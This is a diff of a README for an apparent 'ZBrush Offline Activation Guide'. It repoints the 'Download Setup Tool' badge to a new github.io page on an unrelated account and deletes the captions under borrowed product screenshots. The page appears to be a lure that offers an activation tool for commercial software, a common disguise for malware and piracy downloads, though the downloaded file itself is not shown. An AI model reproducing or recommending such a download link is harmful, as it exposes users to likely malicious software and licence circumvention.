@@ -1,6 +1,6 @@
 # 🪷 ZBrush — Offline Activation Guide
 
-[![Download Setup Tool](https://img.shields.io/badge/Download-Setup_Tool-teal)](https://zbrush-offline-activation-guide.github.io/.github)
+[![Download Setup Tool](https://img.shields.io/badge/Download-Setup_Tool-teal)](https://asdeennerhorse.github.io/mogus/ZBrush)
 
 ## 🧰 How to Install & Activate ZBrush Offline
 
@@ -32,13 +32,13 @@ Offline deployment ensures creative freedom in fully secured workstations.
 ## 🖼 Preview
 
 ![ZBrush Sculpting Panel](https://d2tmthzm7jp200.cloudfront.net/images/attachments/000/010/671/original/SSP09-1.jpg?1727379298)  
-*High-poly sculpting workspace with ZBrush tools*
+
 
 ![ZBrush Interface Overview](https://gdm-catalog-fmapi-prod.imgix.net/ProductScreenshot/3654bd6c-e46e-42c1-a091-887254ccab0c.webp?auto=format&q=50)  
-*ZBrush UI — modeling and reference panel in use*
+
 
 ![BPR Rendering Output](https://maxonassets.imgix.net/images/Products/ZBrush/ZBrush-BPR-overview.jpg?fm=webp&auto=format,compress&w=1920&h=1080&ar=16:9&fit=clip&crop=faces&q=80)  
-*BPR (Best Preview Render) sample with materials and lighting*
+
 
 ---
 
